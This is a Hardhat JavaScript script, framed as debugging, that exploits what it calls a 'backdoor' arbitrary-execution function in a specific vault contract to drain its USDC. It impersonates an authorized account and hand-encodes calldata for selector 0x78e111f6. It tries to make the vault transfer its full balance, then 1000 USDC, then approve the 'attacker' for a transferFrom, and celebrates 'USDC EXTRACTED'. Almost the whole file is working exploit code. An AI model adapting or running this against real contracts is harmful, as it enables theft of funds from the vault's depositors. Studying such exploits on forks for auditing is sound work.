const { ethers } = require("hardhat");

/**
 * @title Trace USDC Transfer
 * @notice Debug why USDC transfer isn't working
 * @dev Trace the exact execution flow
 */
async function main() {
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const AUTHORIZED_ADDRESS = "0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1";
  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  
  const [attacker] = await ethers.getSigners();
  
  console.log("\n🔍 TRACING USDC TRANSFER");
  console.log("=====================================");
  
  // Get interfaces
  const USDC_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)",
    "function approve(address spender, uint256 amount) returns (bool)",
    "function allowance(address owner, address spender) view returns (uint256)"
  ];
  
  const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, ethers.provider);
  
  // Check vault's USDC balance and allowance
  const vaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
  console.log("Vault USDC balance:", ethers.formatUnits(vaultBalance, 6));
  
  // Check if vault has approved itself or any other contract
  const vaultAllowanceToSelf = await usdc.allowance(VAULT_ADDRESS, VAULT_ADDRESS);
  console.log("Vault allowance to self:", ethers.formatUnits(vaultAllowanceToSelf, 6));
  
  // Impersonate and test different approaches
  await ethers.provider.send("hardhat_impersonateAccount", [AUTHORIZED_ADDRESS]);
  const authorized = await ethers.getSigner(AUTHORIZED_ADDRESS);
  
  console.log("\n1️⃣ Testing direct USDC.transfer from vault...");
  
  // Approach 1: Make vault call USDC.transfer directly
  const transferCalldata = usdc.interface.encodeFunctionData("transfer", [
    attacker.address,
    vaultBalance
  ]);
  
  console.log("Transfer calldata:", transferCalldata);
  
  const executeData1 = "0x78e111f6" +
    "000000000000000000000000" + USDC_ADDRESS.slice(2).toLowerCase() +
    "0000000000000000000000000000000000000000000000000000000000000040" +
    ethers.toBeHex(transferCalldata.length / 2 - 1, 32).slice(2) +
    transferCalldata.slice(2);
  
  try {
    console.log("Sending transaction...");
    const tx1 = await authorized.sendTransaction({
      to: VAULT_ADDRESS,
      data: executeData1,
      gasLimit: 500000
    });
    
    console.log("Waiting for receipt...");
    const receipt1 = await tx1.wait();
    
    console.log("✅ Transaction successful!");
    console.log("Gas used:", receipt1.gasUsed);
    
    // Check for Transfer events
    const transferTopic = ethers.id("Transfer(address,address,uint256)");
    const logs = receipt1.logs.filter(log => 
      log.address.toLowerCase() === USDC_ADDRESS.toLowerCase() &&
      log.topics[0] === transferTopic
    );
    
    console.log("Transfer events found:", logs.length);
    
    for (const log of logs) {
      const from = "0x" + log.topics[1].slice(26);
      const to = "0x" + log.topics[2].slice(26);
      const amount = ethers.toBigInt(log.data);
      
      console.log("\nTransfer Event:");
      console.log("From:", from);
      console.log("To:", to);
      console.log("Amount:", ethers.formatUnits(amount, 6), "USDC");
    }
    
  } catch (e) {
    console.log("❌ Failed:", e.message);
  }
  
  // Check balance after attempt
  const attackerBalance1 = await usdc.balanceOf(attacker.address);
  console.log("\nAttacker balance after attempt 1:", ethers.formatUnits(attackerBalance1, 6));
  
  // Approach 2: Try with smaller amount
  console.log("\n2️⃣ Testing with smaller amount (1000 USDC)...");
  
  const smallAmount = ethers.parseUnits("1000", 6);
  const smallTransferData = usdc.interface.encodeFunctionData("transfer", [
    attacker.address,
    smallAmount
  ]);
  
  const executeData2 = "0x78e111f6" +
    "000000000000000000000000" + USDC_ADDRESS.slice(2).toLowerCase() +
    "0000000000000000000000000000000000000000000000000000000000000040" +
    ethers.toBeHex(smallTransferData.length / 2 - 1, 32).slice(2) +
    smallTransferData.slice(2);
  
  try {
    const tx2 = await authorized.sendTransaction({
      to: VAULT_ADDRESS,
      data: executeData2,
      gasLimit: 500000
    });
    
    const receipt2 = await tx2.wait();
    console.log("✅ Small transfer tx:", tx2.hash);
    
  } catch (e) {
    console.log("❌ Small transfer failed:", e.message);
  }
  
  // Approach 3: Check if vault needs to approve first
  console.log("\n3️⃣ Making vault approve attacker first...");
  
  const approveData = usdc.interface.encodeFunctionData("approve", [
    attacker.address,
    vaultBalance
  ]);
  
  const executeApprove = "0x78e111f6" +
    "000000000000000000000000" + USDC_ADDRESS.slice(2).toLowerCase() +
    "0000000000000000000000000000000000000000000000000000000000000040" +
    ethers.toBeHex(approveData.length / 2 - 1, 32).slice(2) +
    approveData.slice(2);
  
  try {
    const approveTx = await authorized.sendTransaction({
      to: VAULT_ADDRESS,
      data: executeApprove,
      gasLimit: 500000
    });
    
    await approveTx.wait();
    console.log("✅ Approval granted!");
    
    // Now attacker can transferFrom
    const usdcSigner = usdc.connect(attacker);
    const transferFromTx = await usdcSigner.transferFrom(
      VAULT_ADDRESS,
      attacker.address,
      vaultBalance,
      { gasLimit: 500000 }
    );
    
    await transferFromTx.wait();
    console.log("✅ TransferFrom executed!");
    
  } catch (e) {
    console.log("❌ Approve/transferFrom failed:", e.message);
  }
  
  // Final balance check
  const finalBalance = await usdc.balanceOf(attacker.address);
  console.log("\n💰 FINAL ATTACKER BALANCE:", ethers.formatUnits(finalBalance, 6), "USDC");
  
  // Stop impersonation
  await ethers.provider.send("hardhat_stopImpersonatingAccount", [AUTHORIZED_ADDRESS]);
  
  if (finalBalance > 0) {
    console.log("\n🎉 SUCCESS! USDC EXTRACTED!");
    console.log("The backdoor allows arbitrary execution from the vault");
    console.log("We used it to make the vault transfer/approve USDC");
  } else {
    console.log("\n❓ STILL INVESTIGATING...");
    console.log("The backdoor executes but USDC transfer fails");
    console.log("Possible reasons:");
    console.log("- The vault doesn't actually hold the USDC");
    console.log("- There's additional validation in the transfer");
    console.log("- The USDC might be in a different contract");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\n💥 Script error:", error);
    process.exit(1);
  });
